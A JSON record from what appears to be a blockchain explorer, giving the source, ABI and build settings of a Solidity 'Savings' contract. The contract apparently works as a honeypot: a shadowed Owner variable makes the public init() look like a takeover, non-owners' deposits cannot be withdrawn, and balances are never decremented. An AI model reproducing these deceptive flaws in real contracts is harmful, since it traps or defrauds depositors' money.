{"status":"1","message":"OK","result":[{"SourceCode":"//\r\n// Licensed under the Apache License, version 2.0.\r\n//\r\npragma solidity ^0.4.17;\r\n\r\ncontract Ownable {\r\n    address public Owner;\r\n    \r\n    function Ownable() { Owner = msg.sender; }\r\n    function isOwner() internal constant returns (bool) { return(Owner == msg.sender); }\r\n}\r\n\r\ncontract Savings is Ownable {\r\n    address public Owner;\r\n    mapping (address => uint) public deposits;\r\n    uint public openDate;\r\n    \r\n    event Initialized(address indexed Owner, uint OpenDate);\r\n    event Deposit(address indexed Depositor, uint Amount);\r\n    event Withdrawal(address indexed Withdrawer, uint Amount);\r\n    \r\n    function init(uint open) payable {\r\n        Owner = msg.sender;\r\n        openDate = open;\r\n        Initialized(Owner, open);\r\n    }\r\n\r\n    function() payable { deposit(); }\r\n    \r\n    function deposit() payable {\r\n        if (msg.value >= 1 ether) {\r\n            deposits[msg.sender] += msg.value;\r\n            Deposit(msg.sender, msg.value);\r\n        }\r\n    }\r\n    \r\n    function withdraw(uint amount) payable {\r\n        if (isOwner() && now >= openDate) {\r\n            uint max = deposits[msg.sender];\r\n            if (amount <= max && max > 0) {\r\n                msg.sender.transfer(amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function kill() payable {\r\n        if (isOwner() && this.balance == 0) {\r\n            selfdestruct(msg.sender);\r\n        }\r\n\t}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"open\",\"type\":\"uint256\"}],\"name\":\"init\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"openDate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"deposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"Owner\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"OpenDate\",\"type\":\"uint256\"}],\"name\":\"Initialized\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"Depositor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"Withdrawer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"}]","ContractName":"Savings","CompilerVersion":"v0.4.17+commit.bdeb9e52","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://2e2fedc47a2c40cfe2d2f9c744749fb55d0553e43a975150d2b62d8acb25225e"}]}